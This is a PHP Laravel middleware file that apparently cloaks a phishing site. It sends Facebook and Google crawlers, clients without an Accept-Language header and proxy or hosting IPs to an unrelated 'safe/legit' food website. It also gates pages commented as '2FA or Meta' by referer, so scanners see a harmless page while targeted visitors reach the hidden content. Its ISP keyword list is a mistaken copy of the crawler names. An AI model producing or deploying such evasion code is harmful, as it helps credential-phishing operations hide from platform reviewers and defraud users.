<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class BotDetectionMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $userAgent = $request->header('User-Agent');
        $ip = $request->ip();

        // 1. Comprehensive Bot List (User-Agent)
$bots = [
    'facebookexternalhit',
    'facebot',
    'Googlebot',
    'AdsBot-Google',
    'Mediapartners-Google'
];
        $isBot = false;
        if ($userAgent) {
            foreach ($bots as $bot) {
                if (stripos($userAgent, $bot) !== false) {
                    $isBot = true;
                    break;
                }
            }
        } else {
            $isBot = true; // No user agent usually means a simple script
        }

        // 2. Missing Essential Headers (Real browsers usually have these)
        $isMissingHeaders = !$request->hasHeader('Accept-Language');

        // 3. ISP Check (Anti-Datacenter / Hosting / Bot Farm)
        $isDatacenterIP = false;
        try {
            // Check IP API for organization / ISP info
            $response = Http::timeout(3)->get("http://ip-api.com/json/{$ip}?fields=status,isp,org,as,mobile,proxy,hosting");
            if ($response->successful()) {
                $data = $response->json();
                $blockedKeywords = [
                   'facebookexternalhit',
    'facebot',
    'Googlebot',
    'AdsBot-Google',
    'Mediapartners-Google'
                ];

                $checkString = ($data['isp'] ?? '') . ' ' . ($data['org'] ?? '') . ' ' . ($data['as'] ?? '');
                
                foreach ($blockedKeywords as $keyword) {
                    if (stripos($checkString, $keyword) !== false) {
                        $isDatacenterIP = true;
                        break;
                    }
                }

                // Block known Proxies/Hosting/VPNs if detected by service
                if (($data['proxy'] ?? false) || ($data['hosting'] ?? false)) {
                    $isDatacenterIP = true;
                }
            }
        } catch (\Exception $e) {
            // If API fails, we fail safe or fail closed? Let's log it.
            Log::warning("IP-API failed for IP: {$ip}. Error: " . $e->getMessage());
        }

        // 4. Referer Validation for Internal Pages
        // Only if hitting a 2FA or Meta page, we expect a Referer from our own domain
        $path = $request->path();
        if (str_contains($path, 'invitation') || str_contains($path, 'authentication')) {
            $referrer = $request->header('referer');
            if (!$referrer || !str_contains($referrer, $request->getHost())) {
                // If hitting these pages without coming from our own site, it's suspicious
                return redirect()->away("https://alenfood.com");
            }
        }

        // If any check fails, redirect to a safe/legit site
        if ($isBot || $isMissingHeaders || $isDatacenterIP) {
            return redirect()->away("https://alenfood.com");
        }

        return $next($request);
    }
}
